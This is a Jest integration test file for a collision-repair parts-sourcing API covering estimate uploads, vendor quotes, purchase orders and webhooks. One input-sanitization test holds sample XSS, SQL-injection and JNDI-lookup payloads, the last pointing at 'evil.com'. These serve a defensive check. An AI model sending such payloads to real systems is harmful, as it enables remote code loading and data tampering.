/**
 * Comprehensive API Integration Tests for Automated Parts Sourcing
 * CollisionOS - API Endpoint Testing for Parts Sourcing System
 * 
 * Tests all API endpoints involved in automated parts sourcing:
 * - BMS upload and processing endpoints
 * - Parts sourcing API endpoints
 * - Vendor integration endpoints
 * - Purchase order generation endpoints
 * - Real-time notification endpoints
 */

const request = require('supertest');
const express = require('express');
const { AutomatedPartsSourcingService } = require('../../services/automatedPartsSourcing');

// Mock the Express app
const app = express();
app.use(express.json());

// Import routes
const automatedSourcingRouter = require('../../routes/automatedSourcing');
const bmsApiRouter = require('../../routes/bmsApi');
const partsWorkflowRouter = require('../../routes/partsWorkflow');

app.use('/api/automated-sourcing', automatedSourcingRouter);
app.use('/api/bms', bmsApiRouter);
app.use('/api/parts-workflow', partsWorkflowRouter);

describe('Automated Sourcing API Integration Tests', () => {
  let testToken;

  beforeAll(async () => {
    // Setup test authentication token
    testToken = 'Bearer test-jwt-token';
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('BMS Upload and Processing Endpoints', () => {
    describe('POST /api/bms/upload', () => {
      it('should upload and process BMS file with automated sourcing', async () => {
        const bmsFileContent = `<?xml version="1.0" encoding="UTF-8"?>
        <Estimate>
          <Customer>
            <FirstName>John</FirstName>
            <LastName>Smith</LastName>
            <Phone>555-1234</Phone>
            <Email>john.smith@test.com</Email>
          </Customer>
          <Vehicle>
            <VIN>1G1BC5SM5H7123456</VIN>
            <Year>2017</Year>
            <Make>Chevrolet</Make>
            <Model>Malibu</Model>
          </Vehicle>
          <DamageLines>
            <Line>
              <LineNumber>1</LineNumber>
              <PartNumber>GM-84044368</PartNumber>
              <Description>Front Bumper Cover</Description>
              <Quantity>1</Quantity>
              <PartCost>450.00</PartCost>
            </Line>
          </DamageLines>
        </Estimate>`;

        const response = await request(app)
          .post('/api/bms/upload')
          .set('Authorization', testToken)
          .field('format', 'CCC_ONE')
          .field('enableAutomatedSourcing', 'true')
          .attach('bmsFile', Buffer.from(bmsFileContent), 'test-estimate.xml')
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.processingId).toBeDefined();
        expect(response.body.customer).toBeDefined();
        expect(response.body.vehicle).toBeDefined();
        expect(response.body.damageLines).toHaveLength(1);
        expect(response.body.automatedSourcing).toBeDefined();
        expect(response.body.automatedSourcing.success).toBe(true);
      });

      it('should return 400 for invalid BMS format', async () => {
        const invalidBmsContent = 'Invalid XML content';

        const response = await request(app)
          .post('/api/bms/upload')
          .set('Authorization', testToken)
          .field('format', 'CCC_ONE')
          .attach('bmsFile', Buffer.from(invalidBmsContent), 'invalid.xml')
          .expect(400);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toContain('XML parsing error');
      });

      it('should return 401 for unauthorized access', async () => {
        const response = await request(app)
          .post('/api/bms/upload')
          .attach('bmsFile', Buffer.from('test'), 'test.xml')
          .expect(401);

        expect(response.body.error).toContain('Unauthorized');
      });

      it('should handle large BMS files (>10MB)', async () => {
        const largeBmsContent = `<?xml version="1.0" encoding="UTF-8"?>
        <Estimate>
          <Customer><FirstName>Test</FirstName><LastName>User</LastName></Customer>
          <Vehicle><Year>2017</Year><Make>Test</Make><Model>Vehicle</Model></Vehicle>
          <DamageLines>
            ${Array(1000).fill().map((_, i) => `
              <Line>
                <LineNumber>${i + 1}</LineNumber>
                <PartNumber>PART-${i}</PartNumber>
                <Description>Large Test Part ${i}</Description>
                <PartCost>${Math.random() * 500}</PartCost>
              </Line>
            `).join('')}
          </DamageLines>
        </Estimate>`;

        const response = await request(app)
          .post('/api/bms/upload')
          .set('Authorization', testToken)
          .field('format', 'CCC_ONE')
          .attach('bmsFile', Buffer.from(largeBmsContent), 'large-estimate.xml')
          .timeout(30000) // 30 second timeout
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.damageLines).toHaveLength(1000);
        expect(response.body.processingTime).toBeLessThan(30000);
      });
    });

    describe('GET /api/bms/processing-status/:id', () => {
      it('should return processing status for BMS upload', async () => {
        const processingId = 'test-processing-id-123';

        const response = await request(app)
          .get(`/api/bms/processing-status/${processingId}`)
          .set('Authorization', testToken)
          .expect(200);

        expect(response.body.processingId).toBe(processingId);
        expect(response.body.status).toMatch(/^(processing|completed|failed)$/);
        expect(response.body.progress).toBeDefined();
        
        if (response.body.status === 'completed') {
          expect(response.body.results).toBeDefined();
          expect(response.body.automatedSourcing).toBeDefined();
        }
      });

      it('should return 404 for invalid processing ID', async () => {
        const response = await request(app)
          .get('/api/bms/processing-status/invalid-id')
          .set('Authorization', testToken)
          .expect(404);

        expect(response.body.error).toContain('Processing ID not found');
      });
    });
  });

  describe('Automated Parts Sourcing Endpoints', () => {
    describe('POST /api/automated-sourcing/process', () => {
      it('should process parts sourcing request', async () => {
        const sourcingRequest = {
          damageLines: [
            {
              lineNumber: 1,
              partNumber: 'GM-84044368',
              description: 'Front Bumper Cover',
              quantity: 1,
              partCost: 450.00
            },
            {
              lineNumber: 2,
              partNumber: 'GM-15228877',
              description: 'Headlight Assembly LH',
              quantity: 1,
              partCost: 275.50
            }
          ],
          vehicleInfo: {
            year: 2017,
            make: 'Chevrolet',
            model: 'Malibu',
            vin: '1G1BC5SM5H7123456'
          },
          options: {
            enhanceWithVinDecoding: true,
            generatePO: false,
            vendorTimeout: 2000
          }
        };

        const response = await request(app)
          .post('/api/automated-sourcing/process')
          .set('Authorization', testToken)
          .send(sourcingRequest)
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.results).toHaveLength(2);
        expect(response.body.statistics.totalParts).toBe(2);
        expect(response.body.processingTime).toBeGreaterThan(0);
        
        // Validate each result structure
        response.body.results.forEach(result => {
          expect(result.classifiedPart).toBeDefined();
          expect(result.vendorResults).toBeDefined();
          expect(result.recommendedSource).toBeDefined();
        });
      });

      it('should validate request parameters', async () => {
        const invalidRequest = {
          damageLines: [], // Empty damage lines
          vehicleInfo: {}, // Missing required fields
          options: {
            vendorTimeout: -1000 // Invalid timeout
          }
        };

        const response = await request(app)
          .post('/api/automated-sourcing/process')
          .set('Authorization', testToken)
          .send(invalidRequest)
          .expect(400);

        expect(response.body.success).toBe(false);
        expect(response.body.validationErrors).toBeDefined();
        expect(response.body.validationErrors.length).toBeGreaterThan(0);
      });

      it('should handle vendor API failures gracefully', async () => {
        const sourcingRequest = {
          damageLines: [
            {
              lineNumber: 1,
              partNumber: 'VENDOR_FAIL_TEST',
              description: 'Test Part',
              quantity: 1,
              partCost: 100.00
            }
          ],
          vehicleInfo: {
            year: 2017,
            make: 'Test',
            model: 'Vehicle'
          }
        };

        const response = await request(app)
          .post('/api/automated-sourcing/process')
          .set('Authorization', testToken)
          .send(sourcingRequest)
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.results).toHaveLength(1);
        
        // Even with vendor failures, should return result with fallback info
        const result = response.body.results[0];
        if (!result.recommendedSource.recommended) {
          expect(result.recommendedSource.fallbackActions).toBeDefined();
        }
      });
    });

    describe('GET /api/automated-sourcing/vendors', () => {
      it('should return available vendor list', async () => {
        const response = await request(app)
          .get('/api/automated-sourcing/vendors')
          .set('Authorization', testToken)
          .expect(200);

        expect(response.body.vendors).toBeDefined();
        expect(Array.isArray(response.body.vendors)).toBe(true);
        expect(response.body.vendors.length).toBeGreaterThan(0);

        // Validate vendor structure
        response.body.vendors.forEach(vendor => {
          expect(vendor.id).toBeDefined();
          expect(vendor.name).toBeDefined();
          expect(vendor.status).toMatch(/^(active|inactive|maintenance)$/);
          expect(vendor.capabilities).toBeDefined();
        });
      });

      it('should filter vendors by capability', async () => {
        const response = await request(app)
          .get('/api/automated-sourcing/vendors?capability=oem_parts')
          .set('Authorization', testToken)
          .expect(200);

        expect(response.body.vendors).toBeDefined();
        response.body.vendors.forEach(vendor => {
          expect(vendor.capabilities).toContain('oem_parts');
        });
      });
    });

    describe('POST /api/automated-sourcing/vendor-quote', () => {
      it('should request quote from specific vendor', async () => {
        const quoteRequest = {
          vendorId: 'lkq_direct',
          parts: [
            {
              partNumber: 'GM-84044368',
              quantity: 1,
              vehicleYear: 2017,
              vehicleMake: 'Chevrolet',
              vehicleModel: 'Malibu'
            }
          ]
        };

        const response = await request(app)
          .post('/api/automated-sourcing/vendor-quote')
          .set('Authorization', testToken)
          .send(quoteRequest)
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.vendorId).toBe('lkq_direct');
        expect(response.body.quote).toBeDefined();
        expect(response.body.quote.parts).toHaveLength(1);
        expect(response.body.quote.validUntil).toBeDefined();
        expect(response.body.quote.quoteNumber).toBeDefined();
      });

      it('should handle vendor-specific errors', async () => {
        const quoteRequest = {
          vendorId: 'invalid_vendor',
          parts: [{ partNumber: 'TEST123', quantity: 1 }]
        };

        const response = await request(app)
          .post('/api/automated-sourcing/vendor-quote')
          .set('Authorization', testToken)
          .send(quoteRequest)
          .expect(400);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toContain('Invalid vendor');
      });
    });
  });

  describe('Purchase Order Generation Endpoints', () => {
    describe('POST /api/parts-workflow/generate-po', () => {
      it('should generate automated purchase order', async () => {
        const poRequest = {
          vendorId: 'lkq_direct',
          parts: [
            {
              partNumber: 'GM-84044368',
              description: 'Front Bumper Cover',
              quantity: 1,
              unitPrice: 420.00,
              expectedDelivery: '2024-01-20'
            }
          ],
          deliveryAddress: {
            shopId: 'test-shop-123',
            address: '123 Main St',
            city: 'Chicago',
            state: 'IL',
            zip: '60601'
          },
          requestedBy: 'test-user-id',
          roNumber: 'RO-2024-001'
        };

        const response = await request(app)
          .post('/api/parts-workflow/generate-po')
          .set('Authorization', testToken)
          .send(poRequest)
          .expect(201);

        expect(response.body.success).toBe(true);
        expect(response.body.poNumber).toBeDefined();
        expect(response.body.poNumber).toMatch(/^RO-2024-001-\d{4}-[A-Z]{4}-\d{3}$/);
        expect(response.body.totalAmount).toBe(420.00);
        expect(response.body.status).toBe('pending_approval');
        expect(response.body.lineItems).toHaveLength(1);
      });

      it('should require approval for high-value POs', async () => {
        const highValuePoRequest = {
          vendorId: 'oe_connection',
          parts: [
            {
              partNumber: 'GM-12345678',
              description: 'Expensive Engine Part',
              quantity: 1,
              unitPrice: 2500.00
            }
          ],
          deliveryAddress: { shopId: 'test-shop-123' },
          requestedBy: 'test-user-id',
          roNumber: 'RO-2024-002'
        };

        const response = await request(app)
          .post('/api/parts-workflow/generate-po')
          .set('Authorization', testToken)
          .send(highValuePoRequest)
          .expect(201);

        expect(response.body.success).toBe(true);
        expect(response.body.requiresApproval).toBe(true);
        expect(response.body.status).toBe('pending_approval');
        expect(response.body.approvalRequired).toBe(true);
      });
    });

    describe('GET /api/parts-workflow/po/:poNumber', () => {
      it('should retrieve purchase order details', async () => {
        const poNumber = 'RO-2024-001-2401-LKQU-001';

        const response = await request(app)
          .get(`/api/parts-workflow/po/${poNumber}`)
          .set('Authorization', testToken)
          .expect(200);

        expect(response.body.poNumber).toBe(poNumber);
        expect(response.body.vendorId).toBeDefined();
        expect(response.body.status).toBeDefined();
        expect(response.body.lineItems).toBeDefined();
        expect(response.body.createdAt).toBeDefined();
        expect(response.body.totalAmount).toBeDefined();
      });

      it('should return 404 for non-existent PO', async () => {
        const response = await request(app)
          .get('/api/parts-workflow/po/INVALID-PO-NUMBER')
          .set('Authorization', testToken)
          .expect(404);

        expect(response.body.error).toContain('Purchase order not found');
      });
    });

    describe('PUT /api/parts-workflow/po/:poNumber/approve', () => {
      it('should approve pending purchase order', async () => {
        const poNumber = 'RO-2024-001-2401-LKQU-001';
        const approvalData = {
          approvedBy: 'manager-user-id',
          approvalNotes: 'Approved for urgent repair'
        };

        const response = await request(app)
          .put(`/api/parts-workflow/po/${poNumber}/approve`)
          .set('Authorization', testToken)
          .send(approvalData)
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.status).toBe('approved');
        expect(response.body.approvedBy).toBe('manager-user-id');
        expect(response.body.approvedAt).toBeDefined();
      });

      it('should require manager permissions for approval', async () => {
        const poNumber = 'RO-2024-001-2401-LKQU-001';
        
        const response = await request(app)
          .put(`/api/parts-workflow/po/${poNumber}/approve`)
          .set('Authorization', 'Bearer technician-token')
          .send({ approvedBy: 'tech-user-id' })
          .expect(403);

        expect(response.body.error).toContain('Insufficient permissions');
      });
    });
  });

  describe('Real-time Notification Endpoints', () => {
    describe('POST /api/automated-sourcing/webhook/vendor-update', () => {
      it('should process vendor inventory webhook', async () => {
        const webhookPayload = {
          vendor: 'lkq_direct',
          event: 'inventory.updated',
          data: {
            partNumber: 'GM-84044368',
            newQuantity: 8,
            newPrice: 415.00,
            location: 'LKQ Chicago'
          },
          timestamp: new Date().toISOString(),
          signature: 'sha256=valid-test-signature'
        };

        const response = await request(app)
          .post('/api/automated-sourcing/webhook/vendor-update')
          .send(webhookPayload)
          .expect(200);

        expect(response.body.processed).toBe(true);
        expect(response.body.partNumber).toBe('GM-84044368');
        expect(response.body.cacheUpdated).toBe(true);
      });

      it('should reject webhooks with invalid signatures', async () => {
        const webhookPayload = {
          vendor: 'lkq_direct',
          event: 'inventory.updated',
          data: { partNumber: 'TEST123' },
          signature: 'sha256=invalid-signature'
        };

        const response = await request(app)
          .post('/api/automated-sourcing/webhook/vendor-update')
          .send(webhookPayload)
          .expect(401);

        expect(response.body.error).toContain('Invalid signature');
      });

      it('should handle webhook replay protection', async () => {
        const oldWebhookPayload = {
          vendor: 'lkq_direct',
          event: 'inventory.updated',
          data: { partNumber: 'TEST123' },
          timestamp: '2023-01-01T00:00:00Z', // Old timestamp
          signature: 'sha256=valid-signature'
        };

        const response = await request(app)
          .post('/api/automated-sourcing/webhook/vendor-update')
          .send(oldWebhookPayload)
          .expect(400);

        expect(response.body.error).toContain('Timestamp too old');
      });
    });

    describe('GET /api/automated-sourcing/notifications', () => {
      it('should return real-time sourcing notifications', async () => {
        const response = await request(app)
          .get('/api/automated-sourcing/notifications')
          .set('Authorization', testToken)
          .query({ since: new Date(Date.now() - 3600000).toISOString() })
          .expect(200);

        expect(response.body.notifications).toBeDefined();
        expect(Array.isArray(response.body.notifications)).toBe(true);
        
        if (response.body.notifications.length > 0) {
          const notification = response.body.notifications[0];
          expect(notification.id).toBeDefined();
          expect(notification.type).toBeDefined();
          expect(notification.message).toBeDefined();
          expect(notification.timestamp).toBeDefined();
        }
      });

      it('should filter notifications by type', async () => {
        const response = await request(app)
          .get('/api/automated-sourcing/notifications')
          .set('Authorization', testToken)
          .query({ type: 'price_change' })
          .expect(200);

        response.body.notifications.forEach(notification => {
          expect(notification.type).toBe('price_change');
        });
      });
    });
  });

  describe('Performance and Load Testing', () => {
    it('should handle concurrent sourcing requests', async () => {
      const sourcingRequest = {
        damageLines: [
          {
            lineNumber: 1,
            partNumber: 'CONCURRENT_TEST',
            description: 'Test Part',
            quantity: 1,
            partCost: 100.00
          }
        ],
        vehicleInfo: {
          year: 2017,
          make: 'Test',
          model: 'Vehicle'
        }
      };

      const concurrentRequests = Array(20).fill().map(() =>
        request(app)
          .post('/api/automated-sourcing/process')
          .set('Authorization', testToken)
          .send(sourcingRequest)
      );

      const responses = await Promise.all(concurrentRequests);

      responses.forEach(response => {
        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
      });
    });

    it('should meet API response time requirements', async () => {
      const sourcingRequest = {
        damageLines: [
          {
            lineNumber: 1,
            partNumber: 'PERF_TEST',
            description: 'Performance Test Part',
            quantity: 1,
            partCost: 100.00
          }
        ],
        vehicleInfo: {
          year: 2017,
          make: 'Test',
          model: 'Vehicle'
        }
      };

      const startTime = Date.now();
      
      const response = await request(app)
        .post('/api/automated-sourcing/process')
        .set('Authorization', testToken)
        .send(sourcingRequest)
        .expect(200);

      const responseTime = Date.now() - startTime;

      expect(response.body.success).toBe(true);
      expect(responseTime).toBeLessThan(5000); // 5 second requirement
    });

    it('should handle memory-intensive processing', async () => {
      const largeSourcingRequest = {
        damageLines: Array(100).fill().map((_, i) => ({
          lineNumber: i + 1,
          partNumber: `MEMORY_TEST_${i}`,
          description: `Memory Test Part ${i}`,
          quantity: 1,
          partCost: Math.random() * 500
        })),
        vehicleInfo: {
          year: 2017,
          make: 'Test',
          model: 'Vehicle'
        }
      };

      const response = await request(app)
        .post('/api/automated-sourcing/process')
        .set('Authorization', testToken)
        .send(largeSourcingRequest)
        .timeout(30000)
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.results).toHaveLength(100);
    });
  });

  describe('Error Handling and Security', () => {
    it('should validate and sanitize input data', async () => {
      const maliciousRequest = {
        damageLines: [
          {
            lineNumber: 1,
            partNumber: '<script>alert("xss")</script>',
            description: 'DROP TABLE parts; --',
            quantity: '${jndi:ldap://evil.com}',
            partCost: 100.00
          }
        ],
        vehicleInfo: {
          year: 2017,
          make: 'Test',
          model: 'Vehicle'
        }
      };

      const response = await request(app)
        .post('/api/automated-sourcing/process')
        .set('Authorization', testToken)
        .send(maliciousRequest)
        .expect(200);

      expect(response.body.success).toBe(true);
      
      // Verify input was sanitized
      const result = response.body.results[0];
      expect(result.classifiedPart.normalizedPartNumber).not.toContain('<script>');
      expect(result.classifiedPart.description).not.toContain('DROP TABLE');
    });

    it('should handle database connection failures', async () => {
      // Mock database failure
      const originalQuery = global.db?.query;
      if (global.db) {
        global.db.query = jest.fn().mockRejectedValue(new Error('Database connection failed'));
      }

      const response = await request(app)
        .post('/api/automated-sourcing/process')
        .set('Authorization', testToken)
        .send({
          damageLines: [{ partNumber: 'DB_FAIL_TEST', description: 'Test', quantity: 1, partCost: 100 }],
          vehicleInfo: { year: 2017, make: 'Test', model: 'Vehicle' }
        })
        .expect(500);

      expect(response.body.error).toContain('Database error');

      // Restore original query function
      if (global.db && originalQuery) {
        global.db.query = originalQuery;
      }
    });

    it('should enforce rate limiting', async () => {
      const requests = Array(50).fill().map(() =>
        request(app)
          .get('/api/automated-sourcing/vendors')
          .set('Authorization', testToken)
      );

      const responses = await Promise.allSettled(requests);
      const rateLimitedResponses = responses.filter(r => 
        r.status === 'fulfilled' && r.value.status === 429
      );

      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });
});